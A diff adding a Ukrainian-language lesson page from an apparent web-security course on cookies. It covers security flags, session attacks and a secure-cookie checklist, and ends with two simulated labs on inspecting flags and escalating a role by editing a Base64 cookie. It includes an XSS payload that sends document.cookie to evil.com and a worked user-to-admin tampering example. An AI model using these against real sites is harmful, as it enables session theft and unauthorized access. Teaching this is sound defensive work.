@@ -1,0 +1,187 @@
+<section class="module-header">
+  <h1>Модуль 04 — Інспекція та маніпуляція cookies</h1>
+  <p>Розберися в анатомії cookies, прапорцях безпеки та способах, якими зловмисники експлуатують слабке управління сесіями.</p>
+</section>
+
+<section class="theory-section">
+
+  <h2>Навіщо існують cookies — проблема пам'яті HTTP</h2>
+  <p>
+    Ось фундаментальна істина про HTTP, яка багатьох дивує: <strong>HTTP не має стану</strong>. Кожен запит, який надсилає твій браузер, сервер сприймає так, ніби він прийшов від абсолютно незнайомої людини. У сервера немає пам'яті про попередні запити. Він не знає, що ти залогінився 2 секунди тому. Він не знає, що ти поклав щось у кошик. Він не знає, що ти існуєш.
+  </p>
+  <p>
+    Це, очевидно, проблема. Ти ж не хочеш вводити пароль на кожній сторінці. Тож у 1994 році Лу Монтуллі — 23-річний програміст із Netscape — винайшов cookies, щоб дати HTTP пам'ять. Ідея була простою: сервер надсилає невеликий фрагмент даних (cookie) браузеру, а браузер автоматично надсилає його назад з кожним наступним запитом до цього сервера. Cookie діє як «бейджик», який каже: «Гей, це знову я, людина, яка залогінилася раніше».
+  </p>
+  <p>
+    Cookies — причина, чому сучасний веб працює. Без них не було б сесій входу, кошиків покупок, чекбоксів «запам'ятай мене», нічого персоналізованого. Вони також причина, чому працюють багато веб-атак — бо cookies надсилаються браузером <em>автоматично</em>, а все, що автоматичне, можна експлуатувати.
+  </p>
+
+  <h2>Анатомія cookie</h2>
+  <p>Кожен cookie має ім'я, значення та набір атрибутів, які контролюють його поведінку:</p>
+
+  <div class="table-wrapper">
+    <table>
+      <thead><tr><th>Атрибут</th><th>Призначення</th><th>Приклад</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Name</strong></td><td>Ідентифікатор cookie</td><td><code>session_id</code></td></tr>
+        <tr><td><strong>Value</strong></td><td>Збережені дані</td><td><code>abc123xyz</code></td></tr>
+        <tr><td><strong>Domain</strong></td><td>Які домени отримують cookie</td><td><code>.example.com</code></td></tr>
+        <tr><td><strong>Path</strong></td><td>Область дії за URL-шляхом</td><td><code>/app</code></td></tr>
+        <tr><td><strong>Expires/Max-Age</strong></td><td>Коли cookie видаляється</td><td><code>Max-Age=3600</code></td></tr>
+        <tr><td><strong>Secure</strong></td><td>Надсилається лише через HTTPS</td><td>Прапорець (boolean)</td></tr>
+        <tr><td><strong>HttpOnly</strong></td><td>Недоступний через JavaScript</td><td>Прапорець (boolean)</td></tr>
+        <tr><td><strong>SameSite</strong></td><td>Захист від CSRF</td><td><code>Strict</code>, <code>Lax</code>, <code>None</code></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h2>Прапорці безпеки детально</h2>
+
+  <h3>Прапорець <code>Secure</code></h3>
+  <p>Коли встановлений, cookie передається лише через HTTPS-з'єднання. Без нього зловмисник у тій самій мережі може перехопити cookies через HTTP.</p>
+
+  <h3>Прапорець <code>HttpOnly</code></h3>
+  <p>Забороняє JavaScript доступ до cookie через <code>document.cookie</code>. Це пом'якшує крадіжку сесій на основі XSS. Без нього:</p>
+  <pre><code class="language-javascript">// XSS payload to steal session cookie
+new Image().src = "https://evil.com/steal?c=" + document.cookie;</code></pre>
+
+  <h3>Атрибут <code>SameSite</code></h3>
+  <ul>
+    <li><strong>Strict:</strong> Cookie ніколи не надсилається при cross-site запитах (найкращий захист від CSRF)</li>
+    <li><strong>Lax:</strong> Надсилається при навігаціях верхнього рівня (лише GET) — типове значення в сучасних браузерах</li>
+    <li><strong>None:</strong> Надсилається завжди (вимагає прапорець <code>Secure</code>) — потрібен для сторонніх контекстів</li>
+  </ul>
+
+  <h2>Cookie-значення, закодовані в Base64</h2>
+  <p>Багато додатків кодують значення cookies у Base64 для передачі. Це <strong>кодування, а не шифрування</strong> — будь-хто може його декодувати:</p>
+  <pre><code class="language-javascript">// Server sets cookie:
+Set-Cookie: session=eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9
+
+// Attacker decodes:
+atob("eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9")
+// → {"user":"guest","role":"user"}
+
+// Attacker modifies and re-encodes:
+btoa('{"user":"guest","role":"admin"}')
+// → eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ==</code></pre>
+
+  <div class="callout callout-danger">
+    <strong>Ніколи не довіряй клієнтським даним.</strong> Cookies можуть бути вільно змінені користувачем. Завжди валідуй дані сесії на стороні сервера. Використовуй підписані/зашифровані токени (як JWT з належною валідацією) замість звичайного Base64.
+  </div>
+
+  <h2>Передбачувані токени сесій</h2>
+  <p>Слабкі токени сесій можна передбачити або підібрати:</p>
+  <ul>
+    <li>Послідовні числа: <code>session=1001</code>, <code>session=1002</code></li>
+    <li>На основі часу: <code>session=1711920000</code></li>
+    <li>Слабкі хеші: MD5 від імені користувача</li>
+  </ul>
+  <p>Безпечні токени повинні бути криптографічно випадковими з ентропією не менше 128 біт.</p>
+
+  <h2>Атаки на сесії — що хакери роблять з cookies</h2>
+  <p>
+    Cookies — це ключі від королівства. Якщо зловмисник отримає твій session cookie, йому не потрібен твій пароль — він і Є тобою, наскільки це стосується сервера. Ось основні атаки на cookies:
+  </p>
+  <ul>
+    <li><strong>Перехоплення сесії (крадіжка cookies):</strong> Крадіжка session cookie через XSS (<code>document.cookie</code>), прослуховування мережі (без прапорця Secure) або шкідливе ПЗ. Маючи cookie, зловмисник видає себе за жертву.</li>
+    <li><strong>Фіксація сесії:</strong> Зловмисник встановлює відомий session ID перед тим, як жертва залогіниться. Якщо сервер не перегенерує session ID після автентифікації, попередньо встановлений зловмисником cookie стає автентифікованою сесією.</li>
+    <li><strong>Підробка cookies:</strong> Якщо дані сесії зберігаються на клієнті (у самому значенні cookie) без належного підпису, зловмисник може змінити їх — замінивши <code>role:user</code> на <code>role:admin</code>.</li>
+    <li><strong>CSRF:</strong> Оскільки cookies надсилаються автоматично з кожним запитом, шкідливий сайт може ініціювати запити до іншого сайту, використовуючи session cookie жертви. (Ми детально розглянемо це в модулі 17.)</li>
+  </ul>
+
+  <div class="callout callout-success">
+    <strong>Чеклист безпечних cookies:</strong> Кожен session cookie повинен мати: (1) прапорець <code>Secure</code> (лише HTTPS), (2) прапорець <code>HttpOnly</code> (без доступу з JavaScript), (3) <code>SameSite=Lax</code> або <code>Strict</code> (захист від CSRF), (4) криптографічно випадкове значення з ентропією не менше 128 біт, (5) відповідний час закінчення дії, та (6) зберігання сесії на сервері (не зберігай конфіденційні дані у самому значенні cookie).
+  </div>
+
+</section>
+
+<!-- ========== LABS ========== -->
+<h2>Labs</h2>
+
+<!-- Lab 1: Cookie Inspector -->
+<div class="lab-container" id="lab1">
+  <div class="lab-header">
+    <div class="lab-title"><span class="lab-num">Lab 1</span> Cookie Inspector</div>
+    <span class="lab-status" id="lab1-status"></span>
+  </div>
+
+  <div class="lab-objective">
+    <strong>Objective:</strong> A simulated login has set a session cookie. Inspect the cookie's attributes, decode the Base64 value, and identify which security flags are missing.
+  </div>
+
+  <button class="btn btn-primary mb-md" id="cookie-login-btn">Simulate Login (Set Cookie)</button>
+
+  <div id="cookie-inspector" style="display:none;">
+    <h4>Cookie Details</h4>
+    <div class="table-wrapper">
+      <table class="cookie-table">
+        <thead><tr><th>Attribute</th><th>Value</th><th>Security Assessment</th></tr></thead>
+        <tbody id="cookie-details"></tbody>
+      </table>
+    </div>
+
+    <h4 class="mt-md">Decoded Value</h4>
+    <div class="json-response" id="cookie-decoded"></div>
+
+    <div class="mt-md input-group">
+      <label>Which security flags are MISSING? (comma-separated)</label>
+      <div class="flex gap-sm">
+        <input type="text" class="input-field" id="cookie-flags-answer" placeholder="e.g., Secure, HttpOnly">
+        <button class="btn btn-primary" id="cookie-flags-submit">Check</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="banner banner-success" id="lab1-banner">
+    &#9989; Correct! You identified the missing security flags.
+  </div>
+  <div class="banner banner-error" id="lab1-error-banner">
+    &#10060; Not quite. Look at the cookie attributes and identify which security flags should be set but aren't.
+  </div>
+</div>
+
+<!-- Lab 2: Cookie Manipulation -->
+<div class="lab-container" id="lab2">
+  <div class="lab-header">
+    <div class="lab-title"><span class="lab-num">Lab 2</span> Cookie Manipulation — Role Escalation</div>
+    <span class="lab-status" id="lab2-status"></span>
+  </div>
+
+  <div class="lab-objective">
+    <strong>Objective:</strong> Your session cookie contains a Base64-encoded JSON object with your role. Decode it, change your role to <code>"admin"</code>, re-encode it, and set the modified cookie to access the admin panel.
+  </div>
+
+  <div class="panel mb-md">
+    <h4>Current Session</h4>
+    <p class="text-muted" style="font-size:0.85rem;">Cookie name: <code>session</code></p>
+    <p class="text-muted" style="font-size:0.85rem;">Current value: <code id="current-cookie-value"></code></p>
+  </div>
+
+  <div class="encoder-grid">
+    <div>
+      <div class="input-group">
+        <label>Step 1: Decoded JSON (modify this):</label>
+        <textarea class="input-field" id="cookie-edit-json" rows="3" style="font-family:var(--font-mono);"></textarea>
+      </div>
+      <div class="input-group">
+        <label>Step 2: Re-encoded Base64:</label>
+        <input type="text" class="input-field" id="cookie-edit-b64" readonly>
+      </div>
+      <div class="flex gap-sm">
+        <button class="btn btn-secondary" id="cookie-encode-btn">Encode to Base64</button>
+        <button class="btn btn-primary" id="cookie-set-btn">Set Cookie &amp; Access Admin Panel</button>
+      </div>
+    </div>
+    <div>
+      <label style="font-size:0.8rem;color:var(--text-secondary);font-weight:600;">Admin Panel:</label>
+      <div class="terminal-output" id="admin-panel" style="min-height:120px;">
+        <span style="color:var(--accent-red);">Access Denied</span>
+        <br>You must be an admin to view this panel.
+      </div>
+    </div>
+  </div>
+
+  <div class="banner banner-success" id="lab2-banner">
+    &#9989; Access granted! You escalated your role by manipulating the session cookie.
+  </div>
+</div>
